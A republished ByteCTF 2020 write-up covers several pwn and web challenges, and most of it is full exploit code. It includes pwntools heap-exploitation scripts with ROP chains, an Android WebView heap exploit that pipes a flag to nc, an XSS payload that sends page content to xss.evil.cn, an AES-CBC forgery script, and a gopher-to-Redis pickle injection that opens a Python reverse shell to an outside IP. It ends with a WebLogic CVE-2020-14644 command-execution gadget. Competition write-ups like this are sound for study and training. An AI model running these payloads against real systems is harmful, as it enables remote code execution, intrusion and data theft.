# Bytectf2020 web&pwn writeup by HuaShuiTeam

阅读量 **241247**

|评论 **3**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-10-27 10:30:31

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

## gun

shoot功能存在逻辑问题导致UAF，可以造成load的bullet再次free

利用unsortedbin构造fake chunk，free进tcache后，直接修改fd指向__free_hook即可

程序存在sandbox，只能orw

setcontext为rdx寄存器，考虑转向IO，通过vtable间接设置:

    
    
    https://kirin-say.top/2020/06/29/0CTF-TCTF-2020-Quals-PWN/
    

或者利用可以通过rdi设置rdx寄存器的gadget：

    
    
    ropper --file ./libc-2.31.so  --search "mov rdx,"
    ......
    0x0000000000154930: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
    ......
    
    
    
    from pwn import *
    context.log_level="debug"
    def add(size,note):
        p.sendlineafter("> ", "3")
        p.sendlineafter("price: ", str(size))
        p.sendafter(": ", note)
    def magic(index):
        p.sendlineafter("> ", "2")
        p.sendlineafter("?", str(index))
    def delete(index):
        p.sendlineafter("> ", "1")
        p.sendlineafter(": ", str(index))
    #p=process("./gun")
    p=remote("123.57.209.176",30772)
    name="name: \n"
    p.sendafter(": ",name)
    for i in range(8):
       add(0x80,"a\n")
    for i in range(8):
        magic(i)
    delete(10)
    add(0x50,"\n")
    magic(0)
    delete(1)
    p.recvuntil("The ")
    libc=u64(p.recv(6)+"\x00\x00")-0x7ffff7fc2be0+0x7ffff7dd7000-0x80
    print hex(libc)
    for i in range(9):
       add(0x80,"bbbbb\n")
    for i in range(9):
        magic(8-i)
    delete(10)
    add(0x410,p64(0)*16+p64(0)+p64(0x31)+p64(0)*5+p64(0x21)+"\n")
    add(0x20,"aaaa\n")
    for i in range(6):
       add(0x10,"bbbbb\n")
    magic(7)
    magic(1)
    delete(3)
    magic(0)
    delete(1)
    add(0x20,"\n")
    magic(0)
    delete(1)
    p.recvuntil("The ")
    heap=u64(p.recv(6)+"\x00\x00")
    print hex(heap)
    #0x55555555b330
    payload=p64(0)+p64(heap-0x55555555b330+0x55555555b760-0x20)+p64(libc+0x580DD)
    rdi=libc+0x0000000000026b72
    rsi=libc+0x27529
    rdx2=libc+0x162866
    rax=libc+0x4a550
    payload2=p64(heap-0x55555555b330+0x55555555b810)+p64(rsi)+p64(0)+p64(rax)+p64(2)+p64(libc+0x111140)
    payload2+=p64(rdi)+p64(3)+p64(rsi)+p64(heap)+p64(rdx2)+p64(0x30)+p64(0)+p64(libc+0x00111130)
    payload2+=p64(rdi)+p64(1)+p64(rsi)+p64(heap)+p64(rdx2)+p64(0x30)+p64(0)+p64(libc+0x001111d0)
    add(0x1b0,payload.ljust(16*8,"\x00")+p64(0)+p64(0x31)+p64(libc+0x00001eeb28)+p64(0)*4+p64(0x21)+"/flag\x00\x00\x00"+p64(0)+payload2+"\n")
    add(0x20,p64(heap-0x55555555b330+0x55555555b820)+p64(rdi)+"\n")
    add(0x20,p64(libc+0x154930)+"\n")
    magic(0)
    delete(1)
    p.interactive()
    

## leak

golang ,添加函数，leak源码中的flag

    
    
    package main
    func main() {
        flag := []int64{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}
        for i, v := range flag {
      flag[i] = v + 1
        }
        hack()
    }
    /* your function will be placed here */
    /* input the whole hack() function as follow */
    /* and end the code with '#' */
    /*
    func hack() {
        TODO
    }
    */
    

利用golang data race造成类型混淆，而后可以进行任意地址读写

考虑flag会在ELF中存一份，在rodata附近爆破出flag保存地址

而后一字节一字节爆破即可

    
    
    from pwn import *
    import sys
    #context.log_level = 'debug'
    p = remote("123.57.209.176",30775)
    flag=""
    key="1234567890abcdef-" #uuid
    flag_index=40#为了稳定，比赛时选择每3字节爆破
    for i in range(3):
      for j in key:
          try:
            tmp= 0x0483000+i*0x8
            p = remote("123.56.96.75",30775)
            magic='''
            func hack() {
                type Mem struct {
                     addr *uintptr 
                     data *uintptr
             }
             m := new(Mem)
             var i, j, k interface{}
             i = (*uintptr)(nil)
             j = &m.data
             var z int=0
             go func(){
                    for {
                        z++
                        k = i
                        func() {
                            if z < 0 {
                            }
                            return
                        }()
                        k = j
                    }
             }()
             for {
              if p, ok := k.(*uintptr); ok && p != nil {  //Race Successuflly
               m.addr = p
               *m.addr=%s
               var o uintptr = *m.data
               if o==%s{   //结果正确=>Crash
                     *m.addr=0
                     *m.data=0
               }
               break
              }
             }
            }
            ''' %(0x483000+72*8+(flag_index+i)*8,ord(j))
            p.sendlineafter("code: \n", magic+"#")
            s=p.recv()
            print s
            if "exit status 2"  in s:
                 flag+=j
                 print flag
                 break
            else:
                 print "no 1"
            p.close()
          except:
            p.close()
            print "no"
    print flag
    #ByteCTF{898ab99c-67d0-4188-81ef-253c12492868}
    

## ohmyjson

golang写的json解析程序

存在混淆，golanghelper恢复没有效果，不过debug信息会有源码位置，因此选择人为制造Crash，可以定位到一些关键函数，和直接获得对应源码位置，根据源码行数可以确定函数

大致流程:read => strings.Split => ParseJson

Split会按照空格分割并判断是否为3个部分

而后会使用jsonparser.Delete，将json中第二个部分指定的成员删除

在逆向出最后一个的作用前，进行简单测试发现利用:

    
    
    # buger/jsonparser 唯一相关CVE(恰好也在jsonparser.Delete)
    https://github.com/buger/jsonparser/issues/188
    

类似的一些非法json，会导致处理时间过长，导致最后一个达到(第三部分比较长时)栈溢出(猜测是Thread返回设置标志位等原因触发溢出函数)，并且一些情况下(第三部分比较短时)可以输出第三部分信息  
debug时可以看到溢出时栈信息:

    
    
    pwndbg> x/100xg $rsp-0xa0
    0xc000045e00:    0x0000555555699c40    0x000000c000102000
    0xc000045e10:    0x000000c000045e40    0x0000555555609ade
    0xc000045e20:    0x0000000000000000    0x0000000000000000
    0xc000045e30:    0x000000c000045de0    0x0000000000000020
    0xc000045e40:    0x0000000000000020    0x000000c00005c180
    0xc000045e50:    0x000000c000045e20    0x0000000000000001
    0xc000045e60:    0x0000000000000000    0x0000000000000000
    0xc000045e70:    0x000000c00005c1e0    0x0000000000000000
    0xc000045e80:    0x0000000000000001    0x0000000000000000
    0xc000045e90:    0x0000000000000000    0x000000c000045f78
    0xc000045ea0:    0x000055555566afd0    0x000000c000000000
    ......
    

溢出会从第三部分的0x30字节往后，覆盖到0xc000045e10地址之后  
可以看到0xc000045e30位置为一个slice:

    
    
    struct slice{
        byte* array;
        uintgo len;
        uintgo cap;
    }
    

debug+硬件断点确定实际输出的是这个slice的数据

0xc000045ea0位置为返回地址

Exploit: 利用golang栈地址相对固定(远程利用报错debug信息可以看到栈地址)来设置好slice结构进行leak程序加载基址

而后部分覆盖返回地址进行复用(1/16爆破)

复用后直接ROP执行execv即可

    
    
    #测试使用"{{{}"这类json也可以
    from pwn import *
    context.log_level="debug"
    #p=process("./chall")
    p=remote("123.57.209.176",30773)
    payload='{{{} a '+"\x00"*0x30
    payload+=(p64(0)*4+p64(0xc00003eea0)+p64(0x50)+p64(0x50)).ljust(0x90,"\x00")
    payload+="\xb0\x6d"
    #0
    #gdb.attach(p)
    p.sendlineafter(": ",payload)
    p.recv(0x10)
    addr=u64(p.recv(8))+0x5603ab9bd000-0x5603abb248a8
    print hex(addr)
    rdi=addr+0x0000000000117867
    rsi2=addr+0x0000000000117865
    rdx=addr+0x00000000000783de
    rax=addr+0x0000000000073339
    syscall=addr+0x000000000009c194
    if addr>0:
         payload='{{{} a '+"\x00"*0xc0
         payload+=p64(rdi)+p64(0xc00003ee18)+p64(rsi2)+p64(0)+p64(0)+p64(rdx)+p64(0)+p64(rax)+p64(0x3b)+p64(syscall)+"/bin/sh\x00"
         p.sendlineafter(": ",payload)
         #gdb.attach(p)
    p.interactive()
    

## pwndroid

环境搭建:

    
    
    sdkmanager --install "system-images;android-24;default;x86"
    echo "no" | avdmanager --verbose create avd --force --name "kirin_magic" --package "system-images;android-24;default;x86" --tag "default" --abi "x86"
    

输入ip，远程会执行

    
    
    adb shell am force-stop ctf.bytedance.pwndroid
    adb shell su root ps | grep "ctf\.bytedance\.pwndroid" | awk '{print $2}' | xargs -t adb shell su root kill -9
    adb shell am start -a android.intent.action.VIEW -d pwndroid://ip
    

即：新开启pwndroid app来加载ip位置网页

看的APK内部native层定义了常见的add edit show delete操作

明显可以通过show直接leak，且在edit时存在堆溢出

堆结构:

    
    
    char* data
    func* print_handle
    

show时会调用print_handle(data)

可以在leak libc后直接通过溢出修改堆中的print_handle函数指针为system来RCE

注意堆风水比较复杂，这里我进行了小的堆喷操作，并利用ELF文件头来确定哪一个index1会溢出到哪一个index2

在NativeMethods中进行了封装，并在JSBridge中调用

PwnMe中看到:

    
    
    this.mWebView.addJavascriptInterface(new JSBridge(this.mWebView), "_jsbridge");
    

加入了_jsbridge对象

直接在html中利用_jsbridge对象间接调用Native层即可

注意callback时因为异步问题，无法在callback函数内部及时更新全局变量（尤其show时，很不方便leak），可以利用延时，通过setTimeout解决

    
    
    //时间紧，写得有点急
    <!DOCTYPE html>
    <html>
    <body>
    Kirin 
    <script>
    var kirin
    var kirin2
    var index
    var index2
    var addr
    var libc_addr
    function getresult(obj) {
       var a=obj['msg']
       if(a[24]=='F' && a[25]=='0' && a[27]=='B'){
        kirin=a
       }
    }
    function get0(obj){
        var tmp=obj['msg']
        if(tmp[0]=='7' && tmp[1] == 'F' ){
            index2=0
        }
    }
    function get1(obj){
        var tmp=obj['msg']
        if(tmp[0]=='7' && tmp[1] == 'F' ){
            index2=1
        }
    }
    function get2(obj){
        var tmp=obj['msg']
        if(tmp[0]=='7' && tmp[1] == 'F' ){
            index2=2
        }
    }
    function get3(obj){
        var tmp=obj['msg']
        if(tmp[0]=='7' && tmp[1] == 'F' ){
            index2=3
        }
    }
    function get4(obj){
        var tmp=obj['msg']
        if(tmp[0]=='7' && tmp[1] == 'F' ){
            index2=4
        }
    }
    function get5(obj){
        var tmp=obj['msg']
        if(tmp[0]=='7' && tmp[1] == 'F' ){
            index2=5
        }
    }
    function get6(obj){
        var tmp=obj['msg']
        if(tmp[0]=='7' && tmp[1] == 'F' ){
            index2=6
        }
    }
    function get7(obj){
        var tmp=obj['msg']
        if(tmp[0]=='7' && tmp[1] == 'F' ){
            index2=7
        }
    }
    function get8(obj){
        var tmp=obj['msg']
        if(tmp[0]=='7' && tmp[1] == 'F' ){
            index2=8
        }
    }
    function get9(obj){
        var tmp=obj['msg']
        if(tmp[0]=='7' && tmp[1] == 'F' ){
            index2=9
        }
    }
    function get10(obj){
        var tmp=obj['msg']
        if(tmp[0]=='7' && tmp[1] == 'F' ){
            index2=10
        }
    }
    function get11(obj){
        var tmp=obj['msg']
        if(tmp[0]=='7' && tmp[1] == 'F' ){
            index2=11
        }
    }
    function get12(obj){
        var tmp=obj['msg']
        if(tmp[0]=='7' && tmp[1] == 'F' ){
            index2=12
        }
    }
    function get13(obj){
        var tmp=obj['msg']
        if(tmp[0]=='7' && tmp[1] == 'F' ){
            index2=13
        }
    }
    function get_final(obj){
        kirin2=obj['msg']
    }
    //document.body.append(typeof _jsbridge)
    function magic(){
     //alert(typeof _jsbridge)
     _jsbridge.call("add", '{"data":{"idx":0,"size":8,"content":"111111111111111111111"}, "cbName": ""}');
     _jsbridge.call("add", '{"data":{"idx":1,"size":8,"content":"2222222222222222222222"}, "cbName": ""}');
     _jsbridge.call("add", '{"data":{"idx":2,"size":8,"content":"33333333333333333333333"}, "cbName": ""}');
     _jsbridge.call("add", '{"data":{"idx":3,"size":8,"content":"44444444444444444444444"}, "cbName": ""}');
     _jsbridge.call("add", '{"data":{"idx":4,"size":8,"content":"55555555555555555555555"}, "cbName": ""}');
     _jsbridge.call("add", '{"data":{"idx":5,"size":8,"content":"666666666666666666666666"}, "cbName": ""}');
     _jsbridge.call("add", '{"data":{"idx":6,"size":8,"content":"777777777777777777777777"}, "cbName": ""}');
     _jsbridge.call("add", '{"data":{"idx":7,"size":8,"content":"888888888888888888888888"}, "cbName": ""}');
     _jsbridge.call("add", '{"data":{"idx":8,"size":8,"content":"99999999999999999999999"}, "cbName": ""}');
     _jsbridge.call("add", '{"data":{"idx":9,"size":8,"content":"aaaaaaaaaaaaaaaaaaaaaaaa"}, "cbName": ""}');
     _jsbridge.call("add", '{"data":{"idx":10,"size":8,"content":"bbbbbbbbbbbbbbbbbbbbbbbbb"}, "cbName": ""}');
     _jsbridge.call("add", '{"data":{"idx":11,"size":8,"content":"ccccccccccccccccccccccccc"}, "cbName": ""}');
     _jsbridge.call("add", '{"data":{"idx":12,"size":8,"content":"ddddddddddddddddddddddddd"}, "cbName": ""}');
     _jsbridge.call("add", '{"data":{"idx":13,"size":8,"content":"eeeeeeeeeeeeeeeeeeeeeeeee"}, "cbName": ""}');
     _jsbridge.call("add", '{"data":{"idx":14,"size":128,"content":"bbbbbbbbbbbbbbbbbbbbbbbbb"}, "cbName": ""}');
     // _jsbridge.call("edit", '{"data":{"idx":0,"size":44,"content":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}, "cbName": ""}');
     //_jsbridge.call("show", '{"data":{"idx":0}, "cbName": getresult}');
     for (var i = 0; i < 14; i++) {
        _jsbridge.call("show", '{"data":{"idx":'+i+'}, "cbName": getresult}');
     }
    setTimeout(function() { 
        addr=parseInt(kirin[24],16)*0x10+parseInt(kirin[25],16)+parseInt(kirin[26],16)*0x1000+parseInt(kirin[27],16)*0x100+parseInt(kirin[28],16)*0x100000+parseInt(kirin[29],16)*0x10000+parseInt(kirin[30],16)*0x10000000+parseInt(kirin[31],16)*0x1000000
        addr=addr-0xbf0
        index=parseInt(kirin[0],16)-1
        tmp = addr.toString(16)  
        //alert(tmp) 
        content='bbbbbbbbbbbbbbbb'+tmp[7-1]+tmp[7-0]+tmp[7-3]+tmp[7-2]+tmp[7-5]+tmp[7-4]+tmp[7-7]+tmp[7-6]
         _jsbridge.call("edit", '{"data":{"idx":'+index+',"size":12,"content":"'+content+'"}, "cbName": ""}');
         for (var i = 0; i < 14; i++) {
            _jsbridge.call("show", '{"data":{"idx":'+i+'}, "cbName": get'+i+'}');
         }
         setTimeout(function() { 
             //alert(index2)
             tmp_addr=addr+0x2FF8
             tmp = tmp_addr.toString(16)   
             content='bbbbbbbbbbbbbbbb'+tmp[7-1]+tmp[7-0]+tmp[7-3]+tmp[7-2]+tmp[7-5]+tmp[7-4]+tmp[7-7]+tmp[7-6]
             _jsbridge.call("edit", '{"data":{"idx":'+index+',"size":12,"content":"'+content+'"}, "cbName": ""}');
             _jsbridge.call("show", '{"data":{"idx":'+index2+'}, "cbName": get_final}');
            setTimeout(function() { 
                //alert(kirin2) 
                libc_addr=parseInt(kirin2[24-24],16)*0x10+parseInt(kirin2[25-24],16)+parseInt(kirin2[26-24],16)*0x1000+parseInt(kirin2[27-24],16)*0x100+parseInt(kirin2[28-24],16)*0x100000+parseInt(kirin2[29-24],16)*0x10000+parseInt(kirin2[30-24],16)*0x10000000+parseInt(kirin2[31-24],16)*0x1000000-0x0014550
                //alert(libc_addr.toString(16))
                content="bbbbbbbbbbbbbbbb"+kirin[8+8]+kirin[8+9]+kirin[8+10]+kirin[8+11]+kirin[8+12]+kirin[8+13]+kirin[8+14]+kirin[8+15]
                tmp_addr=libc_addr+0x0072b60
                tmp = tmp_addr.toString(16)  
                //alert(index)
                //>>> 'sh -c "cat /data/local/tmp/flag | nc 127.0.0.1 6666"\x00'.encode("hex")
                //'7368202d632022636174202f646174612f6c6f63616c2f746d702f666c6167207c206e63203132372e302e302e3120363636362200'
                //>>> len(_)/2
                //53
                content=content+tmp[7-1]+tmp[7-0]+tmp[7-3]+tmp[7-2]+tmp[7-5]+tmp[7-4]+tmp[7-7]+tmp[7-6]
                cmd="7368202d632022636174202f646174612f6c6f63616c2f746d702f666c6167207c206e63203132372e302e302e3120363636362200"
                _jsbridge.call("edit", '{"data":{"idx":'+index+',"size":16,"content":"'+content+'"}, "cbName": ""}');
                _jsbridge.call("edit", '{"data":{"idx":'+index2+',"size":53,"content":"'+cmd+'"}, "cbName": ""}');
                _jsbridge.call("show", '{"data":{"idx":'+index2+'}, "cbName": "get13"}');
            }, 1000)
         }, 1000)
    }, 1000)
    
    }
    //alert(a)
    magic()
    </script>
    </body>
    </html>
    

## easyheap

很明显add时，size获得时有逻辑问题

前后没有进行更新，导致可以任意偏移写一字节”\x00”

利用0x20大小的chunk，和size逻辑问题绕过memset和00截断，直接利用unsorted bin进行leak

而后通过任意偏移写一字节”\x00”，布置好堆布局，恰好修改到一个tcache_free_chunk的fd低字节为00，即可分配到一个构造好chunk的位置，这里我修改fd后恰好指向chunk本身，人为构造了double
free的堆布局

而后tcache attack修改free_hook为system即可在free(“/bin/sh”)时getshell

    
    
    from pwn import *
    context.log_level="debug"
    def add(size,note):
        p.sendlineafter(">> ","1")
        p.sendlineafter(": ",str(size))
        p.sendafter(": ",note)
    def show(index):
       p.sendlineafter(">> ","2")
       p.sendlineafter(": ",str(index))
    def delete(index):
       p.sendlineafter(">> ","3")
       p.sendlineafter(": ",str(index))
    #p=process("./easyheap")
    p=remote("123.57.209.176",30774)
    add(3,"aaa")
    add(3,"aaa")
    delete(0)
    delete(1)
    p.sendlineafter(">> ","1")
    p.sendlineafter(": ",str(0x100))
    p.sendlineafter(": ",str(1))
    p.sendafter(": ","a")
    show(0)
    p.recvuntil("Content: ")
    heap=u64(p.recv(6)+"\x00\x00")
    print hex(heap)
    delete(0)
    for i in range(8):
        add(0x80,"a"*0x80)
    for i in range(8):
        delete(7-i)
    add(8,"/bin/sh\x00")
    add(3,"aaa")
    p.sendlineafter(">> ","1")
    p.sendlineafter(": ",str(0x100))
    p.sendlineafter(": ",str(1))
    p.sendafter(": ","a")
    show(2)
    p.recvuntil("Content: ")
    libc=u64(p.recv(6)+"\x00\x00")+0x7ffff7dd7000-0x7ffff7fc2c61
    print hex(libc)
    p.sendlineafter(">> ","1")
    p.sendlineafter(": ",str(0x91))
    p.sendlineafter(": ",str(0x80))
    p.sendafter(": ","b"*0x80)
    add(0x80,p64(libc+0x01eeb28).ljust(0x80,"\x00"))
    add(0x80,p64(libc+0x01eeb28).ljust(0x80,"\x00"))
    add(0x80,p64(libc+0x0055410)+"\n")
    delete(0)
    p.interactive()
    

## douyin_video

<http://a.bytectf.live:30001/%0a.xxxx.com> 通过正则写的bug，可以跳到任意 www.douyin.com
开头的网站，之后就是xss

在macos上测试，因为 resp.headers[‘X-Frame-Options’] = ‘sameorigin’
同源策略，b.bytectf.live 不会被加载，检测 frames[0].frames.length
即可，但是打远程不成功，之后在linux环境下测试。。。发现居然不检测子域名是否同源，所以无法xsleak。但是发现也不检测端口是否同源，又因为document.domain被提升，直接就能在30002的guestbook上读30001上的document。。。

提交到 c.bytectf.live:30002，然后让bot跳过去就行

    
    
    i = document.createElement('iframe')
    i.src = 'http://b.bytectf.live:30001/send?keyword=Byte'
    document.domain = 'bytectf.live'
    document.body.append(i)
    setTimeout(() => {
    a = i.contentWindow.document.body.innerHTML
    fetch('http://xss.evil.cn/?' + escape(a))
    }, 2000)
    

## secure_website

点开发现路径全部是一串hex，随便改点啥返回，crypto/cipher: input not full blocks

修改不同的地方会出现不同的结果

有

No file.

Bad Request.

File expired.

几种，有部分文件在修改时会出现

    
    
    3a4)A®=º.~J³b!F¡(a96 file, 3a4f6aa5-f42c-4aa1-8a96
    

这种乱码，同时可以注意到 3a4, a96是正确的，乱码的长度是16，而且在对unhex后的16位chunk里面的任意一个修改都会导致乱码。
对这可以确定是用的分组密码，大概率是AES，又注意到在修改的时候对着chunk的第一位修改，会导致结果16位乱码之后的第一位变动，可以推断出是AES-CBC。

这里直接给了解密的结果，而且iv是已知的，只不过用错了一个，根据CBC原理可以直接恢复正确的解密结果，脚本的print(strxor(strxor(decdata,
iv), orgiv))就是解密的结果。

    
    
    import requests
    import binascii
    from Crypto.Util.strxor import strxor
    
    session = requests.session()
    
    url = "http://39.102.70.108:30080/"
    burp0_cookies = {"session": "MTYwMzYwNDU5NHxEdi1CQkFFQ180SUFBUkFCRUFBQU5mLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRCa0FGelZoWkRWbU5XSmxMV1ppTnprdE5HVTJNeTFoTUdSaXxtdMibdvk_cMqwoIhQBYT1yNIvNef_Fdw2aIqaAaSO-w=="}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.80 Safari/537.36", "DNT": "1", "Accept": "text/css,*/*;q=0.1", "Referer": "http://182.92.174.109:30080/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,zh-TW;q=0.8,en;q=0.7", "sec-gpc": "1", "Connection": "close"}
    
    a = 'cbba9c7866cb8ecd9bcbd398f95adcb2f5e830cd6bc057ad15267934624b1d73fbc3a5e6ab72093379f72f4c7e030bc476c3da8d1b69bb1f6f764823627097d6393cdd1f956f416edab58a071069b982e2162060ac228744d19189904f452d4a922146b886c6e97b11151124ad47f46e'
    a = binascii.unhexlify(a)
    
    #a = '73ffb490b0d9f2266a5c673406593ab473b7f3d3b887fd21285e66735a0e34f39a70397ef6d08779d30fcd93bc79685e70a4e76ab7e44a52ac79aa409002f3972661bca9328ef5e243a321a1f10ce03711795ba4bfb46a39e633d66749d83ccdcc7a0a2a2a9b32ee96b9c6ce19bbf7a3'
    
    start_idx = 64
    
    front = a[:start_idx]
    back = a[start_idx+16:]
    org = a[start_idx:start_idx+16]
    
    dec_idx =32
    dec = a[dec_idx:dec_idx+16]
    orgiv = a[dec_idx-16:dec_idx]
    
    iv = front[-16:]
    a = front + dec + org + back
    
    res = session.get(url + binascii.hexlify(a).decode(), headers=burp0_headers, cookies=burp0_cookies)
    
    print(res.text)
    data = res.content
    decdata = data[11:11+16]
    print(decdata)
    print(strxor(strxor(decdata, iv), orgiv))
    
    b'/file?filename=statics/css/lightbox.css&user=76bed7be-b111-413f-'
    b'/file?filename=statics/css/lightbox.css&user=3de920c2-a0f2-4af3-959a&expire\x7f\x0c\xf0\xb0\xb33608963\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    b'/file?filename=statics/css/lightbox.css&user=3de920c2-a0f2-4af3-959a&expired=1603609302\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    
    raw_dec = strxor(decdata, iv)
    print(raw_dec)
    
    poc1 = b'/file?filename=/'
    poc2 = b'flag&aaaaaaaaaaa'
    #poc3 = b'e&aaaaa&user=3de'
    
    poc = poc1
    print(strxor(poc, raw_dec))
    print(binascii.hexlify(strxor(poc, raw_dec)))
    
    # ec8547904a5316352d4bb4fd42e3eca13e2e8d10b1698d2c6624844c76c92fbe0000000000000000000000000000000070a4e76ab7e44a52ac79aa409002f3972661bca9328ef5e243a321a1f10ce03711795ba4bfb46a39e633d66749d83ccdcc7a0a2a2a9b32ee96b9c6ce19bbf7a3
    # b'\x89\xa3}\x80\xf2\x14\x9e\x94\x1e@\xd7|\\\r\xd7}' ^ b'p\xa4\xe7j\xb7\xe4JR\xacy\xaa@\x90\x02\xf3\x97'
    # rawdec b'\xf9\x07\x9a\xeaE\xf0\xd4\xc6\xb29}<\xcc\x0f$\xea'
    
    # ccfa723eeacaf36488126a24310abbfae7e525c32ed219af073437396a4d1466fbc3a5e6ab72093379f72f4c7e030bc476c3da8d1b69bb1f6f764823627097d6393cdd1f956f416edab58a071069b982e2162060ac228744d19189904f452d4a922146b886c6e97b11151124ad47f46e
    
    
    '''
    GET /ccfa723eeacaf36488126a24310abbfae7e525c32ed219af073437396a4d1466fbc3a5e6ab72093379f72f4c7e030bc476c3da8d1b69bb1f6f764823627097d6393cdd1f956f416edab58a071069b982e2162060ac228744d19189904f452d4a922146b886c6e97b11151124ad47f46e HTTP/1.1
    Host: 39.102.70.108:30080
    DNT: 1
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.80 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,en;q=0.7
    Cookie: session=MTYwMzYwNDU5NHxEdi1CQkFFQ180SUFBUkFCRUFBQU5mLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRCa0FGelZoWkRWbU5XSmxMV1ppTnprdE5HVTJNeTFoTUdSaXxtdMibdvk_cMqwoIhQBYT1yNIvNef_Fdw2aIqaAaSO-w==
    sec-gpc: 1
    Connection: close
    '''
    

可以得到加密的其实就是

    
    
    b'/file?filename=statics/css/lightbox.css&user=3de920c2-a0f2-4af3-959a&expired=1603609302\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    

PS. 这里不知道为什么有时候会得到错误的解密结果，比如statihs, filenamn之类的，但换了session之后又正常了。。也不知道怎么回事  
于是在已知当前解密结果外加iv的情况下，可以修改前一chunk来伪造当前chunk的解密结果，可以不停往前重复，伪造全部的结果。就是脚本后半部分的作用，太懒没有自动化，需要手工替换下front
+ dec + org + back 中的 dec和poc1,2,3来伪造。最后尝试读 /etc/passwd 成功，想着读读程序，但是读
/proc/self/cmdline失败，于是直接尝试读/flag，直接就出了

## scrapy

题目是个scrapy，提交url会爬，同时会抓取页面内的链接再爬一次。

猜测抓的a标签会request请求一次，于是测了一下file，发现可以任意读。

fuzz了很多，environ能看到pwd是/code，结合scrapy的项目结构，读了一下scrapy.cfg发现能读到。

    
    
    # Automatically created by: scrapy startproject
    #
    # For more information about the [deploy] section see:
    # https://scrapyd.readthedocs.io/en/latest/deploy.html
    ​
    [settings]
    default = bytectf.settings
    ​
    [deploy]
    #url = http://localhost:6800/
    project = bytectf
    

可以看到没开6800，结合project继续读，何以读到整个项目代码，发现用了mongo和redis。但是scrapy.Request是不支持gopher/dict的，这里就有点卡住了，后来测出来/result路由的请求支持gopher，想到了gopher打redis/mongo。  
gopher打redis，主从/crontab都没成，没回显很缺信息。

gopher打mongo restapi，没成，不知道为啥。

stuck

审了一波scrapy没有找到能完全可控的写pickle序列化字节码操作，后来看代码发现用了spider_redis就翻了一下，发现很明显的scrapy_redis在使用priority_queue等进行请求调度的存取url的过程中，是pickle.dump以后存的，取的时候也直接pickle.load。。。。。

![](https://p2.ssl.qhimg.com/t0167a8db4a4bf5549c.png)

![](https://p5.ssl.qhimg.com/t01824a9fa173dbed66.png)

可以看到是一个有序集合，zadd一个url就行。。注意self.key

然后生成弹shell exp，gopher打就行

    
    
    /result?url=gopher://172.20.0.7:6379/_zadd%2520byte%253Arequests%25201%2520%2522%255Cx80%255Cx03cposix%255Cnsystem%255Cnq%255Cx00X%255Cxe9%255Cx00%255Cx00%255Cx00python%2520-c%2520%255C'import%2520socket%252Csubprocess%252Cos%253Bs%253Dsocket.socket(socket.AF_INET%252Csocket.SOCK_STREAM)%253Bs.connect((%255C%2522139.199.203.253%255C%2522%252C1234))%253Bos.dup2(s.fileno()%252C0)%253B%2520os.dup2(s.fileno()%252C1)%253B%2520os.dup2(s.fileno()%252C2)%253Bp%253Dsubprocess.call(%255B%255C%2522%252Fbin%252Fbash%255C%2522%252C%255C%2522-i%255C%2522%255D)%253B%255C'q%255Cx01%255Cx85q%255Cx02Rq%255Cx03.%2522
    

## jvav

一开始以为没开t3/iiop，以为直接来白嫖http 1day的。。。。。。。。。

后来发现https，参考weblogic_cmd改了一下支持t3s的操作，然后14644一把梭就行。注意coherence版本。

    
    
    public static Object doBlind14644(String c) throws Exception {
        String command = null;
        if (c.startsWith("linux=")) {
            command = "Runtime.getRuntime().exec(new String []{\"/bin/bash\",\"-c\",\"" + c.replace("linux=", "") + "\"});";
        }
    ​
        if (c.startsWith("win=")) {
            command = "Runtime.getRuntime().exec(new String []{\"cmd.exe\",\"/c\",\"" + c.replace("win=", "") + "\"});";
        }
    ​
        String r = getRandomString(10);
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass("com.tangosol.internal.util.invoke.lambda.AbstractRemotableLambda$" + r);
        if (!clazz.isFrozen()) {
            pool.importPackage("java.lang.Runtime");
            CtConstructor cons = new CtConstructor(new CtClass[0], clazz);
            String cmd = "{" + command + "}";
            cons.setBody(cmd);
            clazz.addConstructor(cons);
        }
    ​
        ClassIdentity classIdentity = new ClassIdentity();
        Reflections.setFieldValue(classIdentity, "m_sPackage", "com.tangosol.internal.util.invoke.lambda");
        Reflections.setFieldValue(classIdentity, "m_sBaseName", "AbstractRemotableLambda");
        Reflections.setFieldValue(classIdentity, "m_sVersion", r);
        RemoteConstructor constructor = new RemoteConstructor(new ClassDefinition(classIdentity, clazz.toBytecode()), new Object[0]);
        return constructor;
    }
    

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **郁离歌丶** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/220810](/post/id/220810)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __7赞

 __收藏

